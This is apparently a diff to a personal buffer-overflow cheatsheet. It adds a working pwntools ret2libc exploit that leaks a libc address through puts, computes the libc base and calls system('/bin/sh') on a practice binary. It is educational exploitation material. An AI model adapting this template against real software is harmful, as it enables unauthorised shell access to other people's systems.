@@ -7,11 +7,8 @@ tags: [cheatsheets,buffer-overflow]
 ---
 
 - [pwntools](https://docs.pwntools.com/en/stable/)
-- check protections
-```console
-checksec <binary>
-cat /proc/sys/kernel/randomize_va_space # ASLR
-```
+- check protections: `checksec <binary>`
+- ASLR: `cat /proc/sys/kernel/randomize_va_space`
 
 ## Stack Shellcode
 
@@ -47,5 +44,45 @@ p.interactive()
 
 ## Ret2Libc
 
-- ASLR and Stack Canaries should be disabled
-- get address of system function, of exit function and of the string `/bin/sh`
+- get address of system function and of the string `/bin/sh`
+- libc binary: `ldd <binary>`
+
+```python
+from pwn import *
+
+context.binary = binary = './exploit_me'
+
+elf = ELF(binary)
+rop = ROP(elf)
+
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+p = process()
+
+offset = 18
+padding = b'A'*offset
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(elf.got.gets)
+payload += p64(elf.plt.puts)
+payload += p64(elf.symbols.main)
+
+p.recvline()
+p.sendline(payload)
+p.recvline()
+leak = u64(p.recvline().strip().ljust(8,b'\0'))
+p.recvline()
+
+log.info(f'Gets leak => {hex(leak)}')
+libc.address = leak - libc.symbols.gets
+log.info(f'Libc base => {hex(libc.address)}')
+
+payload = padding
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(next(libc.search(b'/bin/sh')))
+payload += p64(rop.find_gadget(['ret'])[0])
+payload += p64(libc.symbols.system)
+p.sendline(payload)
+p.recvline()
+p.interactive()
+```
